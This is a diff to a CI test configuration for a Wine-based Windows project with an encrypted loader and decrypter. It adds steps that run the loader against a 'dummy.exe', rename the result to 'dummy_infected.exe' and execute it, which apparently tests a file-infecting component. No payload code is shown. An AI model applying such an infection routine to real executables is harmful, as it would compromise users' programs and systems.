@@ -105,8 +105,17 @@ tests-debug:
     - wine bin/decrypter.exe bin/loader_base.exe
     - wine bin/decrypter.exe bin/loader_base_enc.exe
     - wine bin/decrypter.exe bin/release.exe
-    - wine bin/loader_decrypt.exe >/dev/null
+    - wine bin/loader_decrypt.exe
     - wine bin/disasm.exe -fbin/release.exe >/dev/null
+    - cd bin
+    - pwd
+    - wine loader_base_enc.exe
+    - mv -v dummy.exe dummy_infected.exe
+    - mv -v dummy_gui.exe dummy.exe
+    - wine dummy_infected.exe 10
+    - wine dummy.exe &
+    - export DUMMY_GUI_PID=$! && sleep 10 && kill -SIGKILL ${DUMMY_GUI_PID}
+    - cd ..
     - kill -SIGKILL ${XVFB_PID}
   stage: test-wine
   only:
@@ -130,7 +139,16 @@ tests-release:
     - wine bin/decrypter.exe bin/loader_base_enc.exe
     - wine bin/decrypter.exe bin/release.exe
     - wine bin/loader_decrypt.exe
-    - wine bin/disasm.exe -fbin/release.exe
+    - wine bin/disasm.exe -fbin/release.exe >/dev/null
+    - cd bin
+    - pwd
+    - wine loader_base_enc.exe
+    - mv -v dummy.exe dummy_infected.exe
+    - mv -v dummy_gui.exe dummy.exe
+    - wine dummy_infected.exe 10
+    - wine dummy.exe &
+    - export DUMMY_GUI_PID=$! && sleep 10 && kill -SIGKILL ${DUMMY_GUI_PID}
+    - cd ..
     - kill -SIGKILL ${XVFB_PID}
   stage: test-wine
   only:
